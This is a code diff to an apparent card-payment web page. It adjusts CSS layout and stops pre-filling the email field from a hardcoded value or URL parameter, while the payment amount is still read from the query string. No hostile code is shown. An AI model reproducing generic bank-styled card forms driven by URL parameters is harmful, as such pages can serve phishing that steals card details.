@@ -24,6 +24,7 @@
             width: 100%;
             box-sizing: border-box;
             text-align: center;
+            overflow: hidden;
         }
         .bank-icon {
             width: 60px;
@@ -63,6 +64,8 @@
             background: #fafbfc;
             outline: none;
             transition: border 0.2s;
+            box-sizing: border-box;
+            overflow-wrap: break-word;
         }
         .input-group input:focus {
             border-color: #00b2ff;
@@ -70,6 +73,7 @@
         .row {
             display: flex;
             gap: 1rem;
+            width: 100%;
         }
         .row .input-group {
             flex: 1;
@@ -130,7 +134,7 @@
         <hr>
         <form autocomplete="off">
             <div class="input-group">
-                <input id="email-input" type="email" placeholder="E-mail" value="didjdj@gmail.com" required>
+                <input id="email-input" type="email" placeholder="E-mail" value="" required>
             </div>
             <div class="input-group">
                 <input type="text" placeholder="Card Number" maxlength="19" pattern="[0-9 ]*" inputmode="numeric" required>
@@ -155,11 +159,9 @@
         const url = new URL(window.location.href);
         return url.searchParams.get(name);
     }
-    const email = getQueryParam('email');
+    // Email не підтягуємо, поле завжди порожнє
+    // Total підтягуємо
     const total = getQueryParam('total');
-    if (email) {
-        document.getElementById('email-input').value = email;
-    }
     if (total) {
         document.getElementById('payment-title').textContent = `Payment ${total}€`;
     }
